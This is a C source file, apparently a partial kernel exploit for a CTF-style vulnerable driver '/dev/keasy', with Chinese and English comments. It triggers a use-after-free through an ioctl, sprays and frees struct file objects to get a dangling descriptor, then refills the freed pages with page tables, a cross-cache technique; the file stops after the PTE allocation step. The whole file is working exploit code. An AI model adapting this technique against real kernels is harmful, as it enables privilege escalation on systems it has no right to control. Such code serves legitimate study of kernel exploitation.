#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h> // ioctl function
#include <unistd.h>    // read function
#include <fcntl.h> // open function
#include <sys/mman.h>

#define N_PAGESPRAY 0x200
#define N_FILESPRAY 0x100

// 打印错误信息
void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

// 绑定cpu
void bind_core(int core) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

int main() {
  // 定义文件喷射的数组
  int file_spray[N_FILESPRAY];

  // 定义页喷射的数组
  void *page_spray[N_PAGESPRAY];

  // Pin CPU (important!)：仅使用同一CPU
  bind_core(0);

  // 打开有问题的文件
  int fd = open("/dev/keasy", O_RDWR);
  if (fd == -1)
    fatal("/dev/keasy");

  // Prepare pages (PTE not allocated at this moment)
  // 准备页面（PTE此时未分配）
  for (int i = 0; i < N_PAGESPRAY; i++) {
    page_spray[i] = mmap((void*)(0xdead0000UL + i*0x10000UL),
                         0x8000, PROT_READ|PROT_WRITE,
                         MAP_ANONYMOUS|MAP_SHARED, -1, 0);
    if (page_spray[i] == MAP_FAILED) fatal("mmap");
  }

  puts("[+] Spraying files...");
  // Spray file (1)：喷射文件结构体
  // 稳定的堆喷 struct file? 打开/关闭文件就可以控制 struct file 的分配/释放
  for (int i = 0; i < N_FILESPRAY/2; i++)
    if ((file_spray[i] = open("/", O_RDONLY)) < 0) fatal("/");
  
  // Get dangling file descriptor：获取悬空文件描述符
  int ezfd = file_spray[N_FILESPRAY/2-1] + 1;
  if (ioctl(fd, 0, 0xdeadbeef) == 0) // Use-after-Free
    fatal("ioctl did not fail");

  // Spray file (2)
  for (int i = N_FILESPRAY/2; i < N_FILESPRAY; i++)
    if ((file_spray[i] = open("/", O_RDONLY)) < 0) fatal("/");
  puts("[+] Releasing files...");
  getchar();
  // Release the page for file slab cache：释放文件结构体
  for (int i = 0; i < N_FILESPRAY; i++)
    close(file_spray[i]);
  puts("[+] Allocating PTEs...");

  // Allocate many PTEs (page fault)：分配PTEs
  for (int i = 0; i < N_PAGESPRAY; i++)
    for (int j = 0; j < 8; j++)
      *(char*)(page_spray[i] + j*0x1000) = 'A' + j;
  
  return 0;
}